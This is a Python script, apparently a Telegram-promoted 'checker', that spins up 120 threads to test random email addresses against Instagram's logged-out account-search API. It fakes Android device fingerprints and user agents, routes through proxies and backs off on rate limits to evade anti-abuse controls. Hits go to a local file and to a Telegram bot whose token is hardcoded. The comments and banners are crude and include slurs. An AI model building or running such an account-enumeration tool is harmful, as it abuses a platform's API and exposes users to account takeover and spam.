#sexkroge bacheeeeee
#hy nigaa and unkii nigiii
#kyng
#mainpybyrishi

_I='     ·      '
_H='en-IN, en-US'
_G='567067343352427'
_F='err'
_E='nt'
_D='rate'
_C=False
_B=True
_A=None
import requests,time,os,random,secrets,uuid,json,base64,re,sys,queue,threading
from datetime import datetime
from threading import Thread,Lock,local
from requests.adapters import HTTPAdapter

# --- RED THEME ---
P = '\x1b[38;5;196m'  # Red
M = '\x1b[38;5;203m'  # Light Red
B = '\x1b[38;5;210m'  # Very Light Red
R = '\x1b[0m'         # Reset


v_1x='https://t.me/rishihubbu'
v_2x='https://t.me/spamaftersex'
v_2z='spamaftersex'

v_3x=120
v_3y=12
v_3z=20
v_4x=.5
v_4y=.03
v_4z=25
v_5x=2.
v_5y=.05
v_5z=.15
v_6x=.01
v_6y=.05
v_6z=8
v_7x=6
v_7y=7
# Changed path to local folder for Railway compatibility
v_8x='hits.txt'
v_9x=Lock()
v_9y=Lock()
v_9z=Lock()
v_10x=local()
v_10y=0
v_10z=0
v_11x=0
v_11y=0
v_11z=time.time()
v_12x='—'
v_12y={}
v_12z=Lock()

# --- HARDCODED CREDENTIALS ---
v_13x='8883575419:AAGyWUGVY-zjMkYSnTVStwp_0ek3j3tHgBs'
v_13y='8846085944'

v_14x=queue.Queue()
v_14y=queue.Queue()
v_15x=['samsung','Google','Xiaomi','OnePlus','Nothing','HUAWEI','OPPO','vivo','realme','motorola','Sony','Nokia','LG','HTC','ASUS','ZTE','Lenovo','TCL','Honor','Infinix','Tecno','itel','POCO','Redmi','Meizu','Alcatel','Sharp','Panasonic','Micromax','Lava','Karbonn','Wiko','Fairphone','CAT','Doogee','Ulefone','Umidigi','Blackview','Oukitel','Cubot','Elephone','Coolpad','Gionee','Vsmart','Archos','Essential','Razer','Vertu','Turing','Punkt','Crosscall','AGM','Apple']
v_15y=['SM-G973F','Pixel 7','M2102J20SG','ONEPLUS A6003','A063','SM-G991B','SM-G996B','SM-G998B','SM-S901B','SM-S906B','SM-S908B','SM-A525F','SM-A725F','SM-A336B','SM-A536B','SM-A736B','SM-N986B','SM-N981B','SM-F926B','SM-F711B','Pixel 4','Pixel 4a','Pixel 5','Pixel 5a','Pixel 6','Pixel 6a','Pixel 6 Pro','Pixel 7a','Pixel 7 Pro','Pixel 8','Pixel 8 Pro','Pixel 8a','Nexus 5','Nexus 6','Nexus 5X','Nexus 6P','M2101K7AG','M2101K6G','M2103K19G','2201117TY','2201123G','Redmi Note 10','Redmi Note 11','Redmi Note 12','Redmi 9','Redmi 10','POCO X3','POCO X4','POCO F3','POCO F4','POCO M3','POCO M4','Mi 10','Mi 11','Mi 12','Mi 13','Mi Mix 4','ONEPLUS A5000','ONEPLUS A5010','ONEPLUS A6000','ONEPLUS A6010','IN2023','IN2025','LE2101','LE2121','CPH2451','CPH2449','M2007J3SY','M2007J3SG','M2012K11AG','M2102K1AC','V2027','V2045','V2109','V2130','V2145','V2204','V2230','RMX2001','RMX1921','RMX1971','RMX1992','RMX2002','RMX2061','CPH2001','CPH2015','CPH2083','CPH2173','CPH2185','moto g(30)','moto g(50)','moto g(60)','moto g power','moto edge 20','XQ-AT51','XQ-AT52','XQ-BC72','XQ-CT54','XQ-DQ54','Nokia 7.2','Nokia 8.3','Nokia G20','Nokia X20','Nokia 5.4','LM-G900','LM-V600','LM-G910','HTC U11','HTC U12+','HTC Desire 20+','ASUS_I001DA','ASUS_I002D','ASUS_I005DA','ASUS_I006D','ZTE A2020','ZTE Blade 20','ZTE Axon 30','Lenovo K14','Lenovo Z6','Lenovo Tab P11','TCL 20','TCL 20 Pro','TCL 30','ANY-LX1','ANY-LX2','ANY-LX3','BVL-N49','BVL-NX1','Infinix X6815','Infinix X6817','Infinix X688','Infinix X690','TECNO KE5','TECNO KI5','TECNO KG5','TECNO KD7','itel A661L','itel L6006','itel P661L','iPhone 6','iPhone 6 Plus','iPhone 6s','iPhone 6s Plus','iPhone 7','iPhone 7 Plus','iPhone 8','iPhone 8 Plus','iPhone X','iPhone XR','iPhone XS','iPhone XS Max','iPhone 11','iPhone 11 Pro','iPhone 11 Pro Max','iPhone 12','iPhone 12 mini','iPhone 12 Pro','iPhone 12 Pro Max','iPhone 13','iPhone 13 mini','iPhone 13 Pro','iPhone 13 Pro Max','iPhone 14','iPhone 14 Plus','iPhone 14 Pro','iPhone 14 Pro Max','iPhone 15','iPhone 15 Plus','iPhone 15 Pro','iPhone 15 Pro Max','iPad 9','iPad 10','iPad Air 4','iPad Air 5','iPad Pro 11','iPad Pro 12.9','Galaxy Tab S7','Galaxy Tab S8','Galaxy Tab S9','Galaxy Tab A8','Xiaomi Pad 5','Xiaomi Pad 6','Lenovo Tab M10','Lenovo Tab P12']
v_15z=['160','240','280','320','360','400','420','440','450','480','520','560','640']
v_16x=['480x800','540x960','720x1280','720x1440','720x1520','720x1600','750x1334','828x1792','1080x1920','1080x2160','1080x2280','1080x2340','1080x2400','1080x2520','1125x2436','1170x2532','1179x2556','1242x2208','1242x2688','1284x2778','1290x2796','1440x2560','1440x2960','1440x3040','1440x3088','1440x3200','1600x2560','1644x2360','1668x2224','1668x2388','2048x1536','2048x2732','2560x1600','2732x2048']
v_16y=['8','9','10','11','12','13','14','15']
v_16z=[180,190,200,210,220,230,240,250,260,270,280,290,300,310,320,330,340,350]
v_17x=[0,60,120,180,240,300,330,360,420,480,540,570,600,660,720]
v_17y=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_6) Gecko/20130401 Firefox/70.1','Mozilla/5.0 (Windows; Windows NT 6.2; WOW64) Gecko/20100101 Firefox/72.4','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_0_4; en-US) Gecko/20100101 Firefox/72.3','Mozilla/5.0 (Linux; U; Linux i563 x86_64) Gecko/20100101 Firefox/70.6','Mozilla/5.0 (Linux; Android 4.4.4; SM-G900W8 Build/KOT49H) AppleWebKit/537.50 (KHTML, like Gecko) Chrome/47.0.2924.126 Mobile Safari/536.6','Mozilla/5.0 (Linux; U; Android 7.1.1; Xperia V Build/NDE63X) AppleWebKit/602.49 (KHTML, like Gecko) Chrome/54.0.3609.371 Mobile Safari/602.3']
v_18x='5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b'
v_18y='https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/'
v_18z='"user_id"','"pk"','"username"','"full_name"','"profile_pic_url"','"is_private"','"is_verified"','"follower_count"','"account_type"'
v_19x=re.compile('"follower_count"\\s*:\\s*"?(\\d+)"?')
v_19y=json.dumps({'bloks_version':v_18x,'styles_id':'instagram'})
v_19z=_G
v_20x='IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/'
v_20y='en_IN'
v_20z=_H
v_21x='caa_iteration_v3_perf_ig_4'
v_21y='pre_mt_behavior'
v_21z='login_home'
v_22x='logged_out'
v_22y='email_or_username'
v_22z='release'
v_23x=36707139
v_23y={'x-ig-app-id':_G,'x-bloks-version-id':v_18x,'x-fb-friendly-name':v_20x,'x-ig-client-endpoint':'com.bloks.www.caa.ar.search','accept-language':_H,'sec-ch-ua':'"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin'}
v_24x='https://api.telegram.org/bot'
v_24y='/sendMessage'
v_24z='HTML'
v_25x=['@hi2.in','@telegmail.com']
v_25y='abcdefghijklmnopqrstuvwxyz'
v_26x='\x1b[H\x1b[J'

def _proxy():return os.environ.get('HTTPS_PROXY')or os.environ.get('HTTP_PROXY')or _A

def sess(proxy=_A):
	D=proxy or _proxy()or'_noproxy_';B=getattr(v_10x,'sessions',_A)
	if B is _A:B={};v_10x.sessions=B
	A=B.get(D)
	if A is _A:
		A=requests.Session();E=HTTPAdapter(pool_connections=v_3z,pool_maxsize=v_3z,max_retries=0,pool_block=_C);A.mount('https://',E);A.mount('http://',E);A.headers.update({'Connection':'keep-alive'});C=_proxy()
		if C:A.proxies={'http':C,'https':C}
		B[D]=A
	return A

def rnd(dom):A=random.randint(v_7x,v_7y);return''.join(random.choices(v_25y,k=A))+dom

def ig(email):
	Q='hit';P='please wait';O='DENIED';I=email;H='bad';C=str(uuid.uuid4());J=str(uuid.uuid4());K='android-'+secrets.token_hex(8);R=random.choice(v_15x);S=random.choice(v_15y);T=random.choice(v_15z);U=random.choice(v_16x);V=random.choice(v_16y);W=random.choice(v_16z);X=str(random.choice(v_17x));Y=f"Instagram {W}.0.0.{random.randint(10,99)} Android ({V}; {T}dpi; {U}; {R}; {S}; en_US)";Z={'aac':json.dumps({'aac_init_timestamp':int(time.time()),'aacjid':str(uuid.uuid4()),'aaccs':secrets.token_urlsafe(32)}),'flash_call_permissions_status':{'READ_PHONE_STATE':'PERMANENTLY_DENIED','READ_CALL_LOG':O,'ANSWER_PHONE_CALLS':O},'was_headers_prefill_available':0,'network_bssid':_A,'sfdid':'','fetched_email_token_list':{},'search_query':I,'auth_secure_device_id':'','ig_oauth_token':[],'cloud_trust_token':_A,'was_headers_prefill_used':0,'sso_accounts_auth_data':[],'encrypted_msisdn':'','device_network_info':_A,'text_input_id':f"akyuf0:{random.randint(50,70)}",'zero_balance_state':_A,'android_build_type':v_22z,'accounts_list':[],'is_oauth_without_permission':0,'ig_android_qe_device_id':C,'gms_incoming_call_retriever_eligibility':'client_not_supported','search_screen_type':v_22y,'is_whatsapp_installed':1,'lois_settings':{'lois_token':''},'ig_vetted_device_nonce':_A,'headers_infra_flow_id':'','fetched_email_list':[]};a={'event_request_id':str(uuid.uuid4()),'is_from_logged_out':0,'layered_homepage_experiment_group':_A,'device_id':K,'login_surface':v_21z,'waterfall_id':str(uuid.uuid4()),'INTERNAL__latency_qpl_instance_id':random.uniform(63e12,65e12),'is_platform_login':0,'context_data':'','login_entry_point':v_22x,'INTERNAL__latency_qpl_marker_id':v_23x,'family_device_id':J,'offline_experiment_group':v_21x,'access_flow_version':v_21y,'is_from_logged_in_switcher':0,'qe_device_id':C};b={'params':json.dumps({'client_input_params':Z,'server_params':a}),'bk_client_context':v_19y,'bloks_versioning_id':v_18x};L=dict(v_23y);L.update({'User-Agent':Y,'x-ig-android-id':K,'x-ig-app-locale':v_20y,'x-ig-device-id':C,'x-ig-family-device-id':J,'x-ig-timezone-offset':X,'x-mid':base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),'x-pigeon-rawclienttime':str(time.time()),'x-pigeon-session-id':f"UFS-{uuid.uuid4()}-0",'origin':'https://www.instagram.com','referer':'https://www.instagram.com/','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'})
	try:
		D=sess().post(v_18y,data=b,headers=L,timeout=v_3y);E=D.status_code
		if E==429:return _C,0,_D
		if E in(403,400):
			F=D.text.lower()
			if'checkpoint'in F or _D in F or P in F:return _C,0,_D
			return _C,0,H
		if E!=200:return _C,0,H
		G=D.text;A=G.lower()
		if'checkpoint_required'in A or P in A or'rate limit'in A:return _C,0,_D
		c=any(B in A for B in v_18z);M=I.lower()in A;B=0;N=v_19x.search(G)
		if N:
			try:B=int(N.group(1))
			except Exception:B=0
		if c and M:return _B,B,Q
		if M and len(G)>2000 and('"user"'in A or'"data"'in A or'"status":"ok"'in A):return _B,B,Q
		return _C,0,H
	except(requests.exceptions.ConnectTimeout,requests.exceptions.ReadTimeout):return _C,0,_F
	except Exception:return _C,0,_F

def tg(email):
	B='url';A='text'
	if not v_13x or not v_13y:return
	C={'inline_keyboard':[[{A:'🔴 𝐉ᴏɪɴ 🔴',B:v_1x},{A:'🔻 𝐃ᴇᴠᴇʟᴏᴘᴇʀ 🔻',B:v_2x}]]}
	D=f"<b>🔴 𝐒𝐄𝐗 𝐇ɪᴛ 🔴</b>\n<b>🔻 𝐁ʏ 𝐑𝐈𝐒𝐇𝐈 🔻</b>\n\n<b>🔻 𝐌ᴀɪʟ</b> ➵ <code>{email}</code>\n<b>🔴 𝐂ʀᴇᴅɪᴛ</b> ➵ <b>@{v_2z}</b>\n\n<i>🔴 Enjoy your sex hit by RISHI! 🔴</i>"
	E=f"{v_24x}{v_13x}{v_24y}";F={'chat_id':v_13y,A:D,'parse_mode':v_24z,'reply_markup':json.dumps(C)}
	try:sess().post(E,json=F,timeout=15)
	except Exception:0

def draw():
	if not v_9y.acquire(blocking=_C):return
	try:
		with v_9x:F,G,C,N,H=v_10y,v_10z,v_11x,v_11y,v_12x
		D=time.time()-v_11z;O=C/D if D>0 else 0
		
		# MAIN LIVE PANEL + 5 BOTTOM BANNERS
		K=f"""
{P}╭────────────────────────────────╮
{P}│  🔴 {M}𝐒 𝐄 𝐗   𝐂 𝐇 𝐄 𝐂 𝐊 𝐄 𝐑{M} 🔴  {P}│
{P}│  🔻 {M}𝐁 𝐘   𝐑 𝐈 𝐒 𝐇 𝐈{M} 🔻  {P}│
{P}├────────────────────────────────┤
{P}│  🔻 {M}𝐇 𝐈 𝐓 𝐒{M}       ➜  {B}{F}{R}       {P}│
{P}│  🔴 {M}𝐁 𝐀 𝐃{M}         ➜  {B}{G}{R}       {P}│
{P}│  🔻 {M}𝐂 𝐇 𝐄 𝐂 𝐊 𝐄 𝐃{M}   ➜  {B}{C}{R}       {P}│
{P}│  🔴 {M}𝐋 𝐀 𝐒 𝐓{M}        ➜  {B}{H[:12].ljust(12)}{R}  {P}│
{P}╰────────────────────────────────╯
{M}    🔴 Stay Sexy, Stay Safe 🔻{R}

{P}══════════ {M}𝐑 𝐈 𝐒 𝐇 𝐈{P} ══════════{R}

{P}    {M}██╗  ██╗ ██╗ ███████╗ ██╗  ██╗ ██╗{P}
{P}    {M}██║  ██║ ██║ ██╔════╝ ██║  ██║ ██║{P}
{P}    {M}███████║ ██║ ███████╗ ███████║ ██║{P}
{P}    {M}██╔══██║ ██║ ╚════██║ ██╔══██║ ██║{P}
{P}    {M}██║  ██║ ██║ ███████║ ██║  ██║ ██║{P}
{P}    {M}╚═╝  ╚═╝ ╚═╝ ╚══════╝ ╚═╝  ╚═╝ ╚═╝{P}{R}

{P}★ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ★{R}
{P}★ {M}🔴 𝐑 𝐈 𝐒 𝐇 𝐈  𝐒 𝐄 𝐗  𝐂 𝐇 𝐄 𝐂 𝐊 𝐄 𝐑 🔻{P} ★{R}
{P}★ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ★{R}

{P}▸ ▸ ▸  {M}𝐄 𝐍 𝐉 𝐎 𝐘   𝐓 𝐇 𝐄   𝐇 𝐈 𝐓 𝐒  {P} ◂ ◂ ◂{R}

{P}•  {M}𝐁 𝐘  {P}•  {M}𝐑 𝐈 𝐒 𝐇 𝐈{P}  •  {M}𝐇 𝐔 𝐁{P}  •

{P}┌────────────────────────────────┐
{P}│   {M}𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐑𝐈𝐒𝐇𝐈 🔴{P}       │
{P}└────────────────────────────────┘{R}
""";sys.stdout.write(v_26x);print(K);sys.stdout.flush()
	finally:v_9y.release()

def loop_draw():
	while _B:time.sleep(1.);draw()

def file_writer():
	A=[];B=time.time()
	while _B:
		try:A.append(v_14x.get(timeout=v_4x))
		except queue.Empty:0
		C=time.time()
		if A and(len(A)>=v_4z or C-B>v_5x):
			with v_9z:
				try:
					with open(v_8x,'a',encoding='utf-8')as D:
						for E in A:D.write(E+'\n')
					B=C
				except Exception:0
			A=[]

def tg_worker():
	while _B:
		try:A=v_14y.get()
		except Exception:continue
		tg(A);time.sleep(v_4y)

def worker(wid):
	global v_10y,v_10z,v_11x,v_11y,v_12x
	while _B:
		C=random.choice(v_25x);A=rnd(C)
		with v_9x:v_11x+=1
		D,E,B=ig(A)
		if D:
			with v_9x:v_10y+=1;v_12x=A
			v_14x.put(A);v_14y.put(A)
		else:
			with v_9x:
				if B==_D:v_11y+=1
				else:v_10z+=1
			if B==_D:time.sleep(random.uniform(v_5y,v_5z))
			elif B==_F:time.sleep(random.uniform(v_6x,v_6y))

def main():
	B='clear';A='cls';global v_13x,v_13y;os.system(A if os.name==_E else B)
	
	print(f"""
{P}██████╗ {M}██╗{P}███████╗{M}██╗  ██╗{P}██╗
{P}██╔══██╗{M}██║{P}██╔════╝{M}██║  ██║{P}██║
{P}██████╔╝{M}██║{P}███████╗{M}███████║{P}██║
{P}██╔══██╗{M}██║{P}╚════██║{M}██╔══██║{P}██║
{P}██║  ██║{M}██║{P}███████║{M}██║  ██║{P}██║
{P}╚═╝  ╚═╝{M}╚═╝{P}╚══════╝{M}╚═╝  ╚═╝{P}╚═╝{R}
{M}        🔴 𝐁 𝐘   𝐑 𝐈 𝐒 𝐇 𝐈 🔻{R}
""")

	print(f"""
{P}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
{P}▓  {M}🔴  𝐑 𝐈 𝐒 𝐇 𝐈  🔴{P}              ▓
{P}▓  {M}𝐒𝐄𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐀𝐂𝐓𝐈𝐕𝐄{P}          ▓
{P}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{R}
{M}   🔻 120 threads loading... 🔴{R}
""")

	# Start background threads
	Thread(target=file_writer,daemon=_B).start()
	Thread(target=tg_worker,daemon=_B).start()
	Thread(target=loop_draw,daemon=_B).start()
	
	# Start 120 worker threads
	for C in range(v_3x):Thread(target=worker,args=(C+1,),daemon=_B).start()
	
	try:
		while _B:time.sleep(1)
	except KeyboardInterrupt:print(f"\n{M}🔴 Sex checker by RISHI stopped. 🔻{R}")

if __name__=='__main__':main()
